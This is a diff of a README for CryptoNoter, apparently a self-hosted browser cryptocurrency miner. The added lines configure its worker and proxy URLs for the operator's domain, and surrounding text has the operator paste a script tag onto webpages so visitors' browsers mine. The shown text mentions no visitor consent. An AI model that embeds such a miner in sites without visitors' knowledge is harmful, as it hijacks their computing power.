@@ -47,6 +47,18 @@ data:    [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379    7385    /root
 ```
 * Make sure you have uploaded the web folder to your domain public_html or domain root. Ensure you can access https://YOUR_DOMAIN_NAME/demo.html
 
+* Change the settings for these files: worker.js, processor.js & lib/cryptonight-asmjs.min.js
+Replace %CryptoNoter_domain% with your DOMAIN_NAME
+```html
+self.CryptoNoter = self.CryptoNoter || {};
+self.CryptoNoter.CONFIG = {
+    LIB_URL: "https://%CryptoNoter_domain%/lib/",
+    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
+    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
+    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+};
+```
+
 * Add the following javascript before the `</head>` tag onto webpages that you want the miner to run on. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet
 ```html
 <script src="https://www.cryptonoter.com/processor.js"></script>
